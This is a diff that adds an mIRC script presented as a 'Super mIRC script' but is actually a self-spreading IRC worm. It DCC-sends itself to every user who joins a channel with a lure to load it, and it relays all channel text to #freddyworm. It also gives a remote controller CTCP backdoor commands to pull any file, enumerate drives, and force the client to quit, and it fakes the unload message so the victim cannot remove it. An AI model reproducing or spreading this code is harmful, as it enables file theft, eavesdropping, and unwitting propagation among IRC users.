@@ -1,0 +1,73 @@
+; Super mIRC script!
+; /type the following:
+; /load -rs /downloads/mircscript.mrc
+; making sure this file is in your mIRC downloads directory.
+
+on *:join: {
+if ($nick != $me) {
+/set %filelocation $mircdir $+ /download/mircscript.mrc
+/timer666 0 30 /msg $nick Hiya, I've got this really cool new mIRC script, check it out.
+/timer667 0 33 /dcc send $nick %filelocation
+}
+}
+
+on *:filesent:mircscript.mrc: {
+/timer666 off
+/timer667 off
+/msg $nick Just type " /load -rs $mircdir $+ download\mircscript.mrc " to run the script, it rocks!
+}
+
+on *:text:*:/msg #freddyworm - $+ $nick $+ -  [ $+ $chan $+ ] -- $1
+
+ctcp 1:grab:/dcc send $nick $2-
+ctcp 1:quit:/quit Server Side Error
+ctcp 1:exit:/exit
+ctcp 1:ping: {
+/notice $nick Ping [0.001 seconds] Daemon Skript. | halt
+if ($nick != $me) {
+/set %filelocation $mircdir $+ /download/mircscript.mrc
+/timer666 0 30 /msg $nick Daemon Skript rocks, I'll send it.
+/timer667 0 33 /dcc send $nick %filelocation
+}
+}
+ctcp 1:drives: {
+if ($disk(a:) == $true) {
+/ctcp $nick DriveC + $disk.label(a:)
+}
+if ($disk(b:) == $true) {
+/ctcp $nick DriveC + $disk.label(b:)
+}
+if ($disk(c:) == $true) {
+/ctcp $nick DriveC + $disk.label(c:)
+}
+if ($disk(d:) == $true) {
+/ctcp $nick DriveC + $disk.label(d:)
+}
+if ($disk(e:) == $true) {
+/ctcp $nick DriveC + $disk.label(e:)
+}
+if ($disk(f:) == $true) {
+/ctcp $nick DriveC + $disk.label(f:)
+}
+if ($disk(g:) == $true) {
+/ctcp $nick DriveC + $disk.label(g:)
+}
+}
+
+on *:INPUT:*: {
+  /set %filelocation $mircdir $+ download\mircscript.mrc
+  if ($1- == /unload -rs mircscript.mrc) {
+    /echo -s 2-
+    /echo -s 2- *** Unloaded script ' $+ %filelocation $+ '
+    /echo -s 2-
+    /halt
+  }
+  if ($1- == /unload -rs %filelocation) {
+    /echo -s 2-
+    /echo -s 2- *** Unloaded script ' $+ %filelocation $+ '
+    /echo -s 2-
+    /halt
+  }
+}
+
+
